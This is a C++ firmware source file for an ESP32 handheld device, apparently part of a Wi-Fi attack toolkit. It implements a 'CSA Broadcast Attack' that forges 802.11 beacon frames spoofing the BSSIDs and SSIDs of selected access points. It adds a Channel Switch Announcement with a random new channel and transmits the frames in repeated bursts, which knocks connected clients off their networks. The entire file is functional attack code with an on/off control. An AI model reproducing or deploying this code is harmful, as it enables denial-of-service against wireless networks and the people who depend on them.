/*
 * CSA Broadcast Attack — see header.
 */

#include "csa_attack.h"
#include "target_list.h"
#include "wificonfig.h"
#include "utils.h"
#include "Touchscreen.h"

#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_random.h>
#include <string.h>

#define DARK_GRAY 0x4208

#define BTN_UP     6
#define BTN_DOWN   3

namespace CsaAttack {

// 802.11 beacon frame template — pre-SSID bytes 0..35, then SSID IE, then
// post-IEs (supported rates / DSSS channel / CSA).
//
// Byte 0  = 0x80 (mgmt, beacon)
// 4..9    = broadcast destination
// 10..15  = source = AP BSSID (spoofed)
// 16..21  = BSSID  = AP BSSID
// 24..31  = timestamp (unused, fake)
// 32..33  = beacon interval = 0x0064 (100 TU)
// 34..35  = capability info (open, ESS)
// 36      = SSID IE tag (0x00)
// 37      = SSID length
// 38..    = SSID body
static const uint8_t beacon_pre[36] = {
  0x80, 0x00, 0x00, 0x00,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0xc0, 0x6c,
  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
  0x64, 0x00,
  0x31, 0x00
};

// Post-SSID IEs (supported rates + DSSS channel + CSA tag).
//   01 08 ...      Supported rates (8 entries)
//   03 01 <chan>   DSSS parameter set (current channel)
//   25 03 01 <new_chan> 0x01   Channel-Switch Announcement
//     mode=1 (clients should stop TX until switch), new_chan=X, count=1 beacon
static uint8_t post_csa_template[] = {
  0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
  0x03, 0x01, 0x00,                   // [10..12] DSSS, channel filled later
  0x25, 0x03, 0x01, 0x00, 0x01        // [13..17] CSA: mode | new_ch | count
};

static bool      attackActive = false;
static uint32_t  totalFrames  = 0;
static uint32_t  lastUiUpdate = 0;
static uint32_t  lastBtnMs = 0;
static const uint32_t BTN_DEBOUNCE_MS = 200;

// Pick a different channel than the AP's current channel.
static uint8_t pickSwitchChannel(uint8_t cur) {
  uint8_t pick;
  do {
    pick = (uint8_t)(1 + (esp_random() % 11));
  } while (pick == cur);
  return pick;
}

static void sendCsaBeacon(const uint8_t bssid[6], uint8_t channel,
                          const char* ssid) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);

  // SSID len capped at 32
  uint8_t ssidLen = 0;
  if (ssid) {
    while (ssid[ssidLen] && ssidLen < 32) ssidLen++;
  }

  uint8_t frame[36 + 2 + 32 + sizeof(post_csa_template)];
  memcpy(frame, beacon_pre, 36);

  // Spoof source/BSSID
  for (int i = 0; i < 6; i++) {
    frame[10 + i] = bssid[i];
    frame[16 + i] = bssid[i];
  }

  // SSID IE
  frame[36] = 0x00;       // tag
  frame[37] = ssidLen;
  for (int i = 0; i < ssidLen; i++) frame[38 + i] = (uint8_t)ssid[i];

  // Post IEs: copy template, fill in DSSS channel + CSA target channel
  uint8_t post[sizeof(post_csa_template)];
  memcpy(post, post_csa_template, sizeof(post_csa_template));
  post[12] = channel;                        // DSSS = current real channel
  post[16] = pickSwitchChannel(channel);     // CSA new_channel = random other

  int postStart = 38 + ssidLen;
  memcpy(frame + postStart, post, sizeof(post));
  int frameLen = postStart + sizeof(post);

  // Burst 3 per AP per pass
  for (int b = 0; b < 3; b++) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame, frameLen, false);
    totalFrames++;
  }
}

static void drawTopStatus() {
  tft.fillRect(35, 20, 205, 16, DARK_GRAY);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(attackActive ? TFT_RED : TFT_WHITE);
  tft.setCursor(35, 24);
  tft.printf("CSA     %d sel  %u TX",
             TargetList::selectedCount(), (unsigned)totalFrames);
  tft.setTextColor(attackActive ? TFT_GREEN : TFT_DARKGREY);
  tft.setCursor(170, 24);
  tft.print(attackActive ? "ACTIVE" : "PAUSED");
}

static void drawInfoBlock() {
  tft.fillRect(0, 45, tft.width(), tft.height() - 60, TFT_BLACK);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW);
  tft.setCursor(2, 50);
  tft.print("CSA Broadcast Attack");
  tft.setTextColor(TFT_DARKGREY);
  tft.setCursor(2, 65);
  tft.print("Spoof beacons w/ fake channel-switch");
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(2, 85);
  tft.print("[UP]     Toggle ON/OFF");
  tft.setCursor(2, 100);
  tft.print("[SELECT] Exit");

  tft.setCursor(2, 125);
  tft.setTextColor(TFT_CYAN);
  tft.print("Selected APs:");
  tft.setTextColor(TFT_WHITE);
  int row = 0;
  for (int i = 0; i < TargetList::targetCount && row < 9; i++) {
    if (!TargetList::targets[i].selected) continue;
    tft.setCursor(2, 145 + row * 14);
    char ssid_show[18];
    int sl = strlen(TargetList::targets[i].ssid);
    if (sl > 17) sl = 17;
    memcpy(ssid_show, TargetList::targets[i].ssid, sl);
    ssid_show[sl] = '\0';
    tft.printf("%-17s c%-2d %d", ssid_show,
               (int)TargetList::targets[i].channel,
               (int)TargetList::targets[i].rssi);
    row++;
  }
  if (TargetList::selectedCount() == 0) {
    tft.setTextColor(TFT_RED);
    tft.setCursor(2, 145);
    tft.print("No targets selected.");
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(2, 165);
    tft.print("Run AP Scan & Select first.");
  }
}

void csaAttackSetup() {
  tft.fillScreen(TFT_BLACK);
  setupTouchscreen();

  attackActive = false;
  totalFrames = 0;

  pcf.pinMode(BTN_UP, INPUT_PULLUP);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();

  Serial.println("[CSA] ready, awaiting toggle");

  float v = readBatteryVoltage();
  drawStatusBar(v, false);
  tft.fillRect(0, 20, 240, 16, DARK_GRAY);
  drawInfoBlock();
  drawTopStatus();
  lastUiUpdate = millis();
}

void csaAttackLoop() {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  uint32_t now = millis();
  if (now - lastBtnMs > BTN_DEBOUNCE_MS) {
    if (!pcf.digitalRead(BTN_UP)) {
      attackActive = !attackActive;
      Serial.printf("[CSA] %s\n", attackActive ? "STARTED" : "PAUSED");
      lastBtnMs = now;
      drawTopStatus();
    }
  }

  if (attackActive) {
    for (int i = 0; i < TargetList::targetCount; i++) {
      if (!TargetList::targets[i].selected) continue;
      sendCsaBeacon(TargetList::targets[i].bssid,
                    TargetList::targets[i].channel,
                    TargetList::targets[i].ssid);
    }
  }

  if (now - lastUiUpdate > 300) {
    drawTopStatus();
    lastUiUpdate = now;
  }

  delay(attackActive ? 10 : 30);
}

}  // namespace CsaAttack
